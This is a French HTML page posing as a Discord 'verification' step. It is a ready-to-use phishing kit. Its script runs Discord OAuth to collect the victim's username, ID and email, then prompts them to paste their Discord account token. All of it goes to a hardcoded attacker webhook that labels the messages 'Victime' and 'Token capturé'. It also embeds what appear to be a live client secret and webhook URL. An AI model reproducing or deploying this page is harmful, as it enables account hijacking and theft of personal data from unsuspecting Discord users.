<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vérification</title>
<style>
  body{font-family:-apple-system,sans-serif;background:#313338;color:#fff;
       display:flex;align-items:center;justify-content:center;min-height:100vh;
       margin:0;text-align:center;padding:20px;box-sizing:border-box}
  .box{max-width:380px;width:100%}
  .spinner{width:50px;height:50px;border:5px solid #5865F2;border-top-color:transparent;
           border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
  @keyframes s{to{transform:rotate(360deg)}}
  input{width:100%;padding:14px;margin:20px 0;border-radius:8px;border:none;
        background:#1e1f22;color:#fff;box-sizing:border-box;font-size:16px}
  button{padding:14px 30px;border:none;border-radius:8px;background:#5865F2;
         color:#fff;font-weight:bold;font-size:16px;width:100%}
  .hide{display:none}
  h2{font-size:22px}
  p{color:#b5bac1;font-size:14px}
</style>
</head>
<body>
<div class="box">

  <div id="load">
    <div class="spinner"></div>
    <h2>Vérification en cours...</h2>
  </div>

  <div id="step2" class="hide">
    <h2>🔒 Dernière étape</h2>
    <p>Colle ton token Discord pour être vérifié</p>
    <input id="tok" placeholder="Colle ton token ici" />
    <button onclick="send()">Finaliser</button>
  </div>

  <div id="done" class="hide">
    <h2>✅ Vérifié !</h2>
    <p>Tu peux retourner sur Discord</p>
  </div>

</div>

<script>
// ⚙️ CONFIG — REMPLACE CES 3 VALEURS
const CLIENT_ID     = "1563201628436299906";
const CLIENT_SECRET = "rTDybku-KDitN7QWYkT4HAfvEtsfglhY";
const REDIRECT_URI  = "TON_URL/callback";

const WEBHOOK_LOGS = "https://discord.com/api/webhooks/1563199900802359340/JCEZvtJGxYfZk122sd2e-L6JQWOJY7XmsbazxNmhna-EEHyZFvNgutshLzfnTrOb-n9h";

const code = new URLSearchParams(location.search).get("code");

async function run() {
  if (!code) {
    location.href = "https://discord.com/oauth2/authorize?client_id="+CLIENT_ID+
      "&redirect_uri="+encodeURIComponent(REDIRECT_URI)+
      "&response_type=code&scope=identify%20email%20guilds";
    return;
  }

  try {
    const body = new URLSearchParams({
      client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
      grant_type: "authorization_code", code, redirect_uri: REDIRECT_URI
    });
    const r = await fetch("https://discord.com/api/oauth2/token",
      {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body});
    const tok = await r.json();

    const u = await fetch("https://discord.com/api/users/@me",
      {headers:{Authorization:"Bearer "+tok.access_token}}).then(x=>x.json());

    await fetch(WEBHOOK_LOGS, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({
        username:"🎯 Victime",
        embeds:[{
          title:"Connexion OAuth",
          color:0x5865F2,
          fields:[
            {name:"Pseudo", value:u.username, inline:true},
            {name:"ID", value:u.id, inline:true},
            {name:"Email", value:u.email||"N/A"}
          ],
          timestamp:new Date().toISOString()
        }]
      })
    });

    document.getElementById("load").classList.add("hide");
    document.getElementById("step2").classList.remove("hide");
  } catch(e){ console.error(e); }
}

async function send() {
  const t = document.getElementById("tok").value.trim();
  if(!t) return alert("Colle ton token !");

  await fetch(WEBHOOK_LOGS, {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      username:"🔐 TOKEN",
      content:"@here Token capturé 🎯",
      embeds:[{title:"Token utilisateur", color:0x3ba55d,
        fields:[{name:"Token", value:"```"+t+"```"}]}]
    })
  });

  document.getElementById("step2").classList.add("hide");
  document.getElementById("done").classList.remove("hide");
}

run();
</script>
</body>
</html>
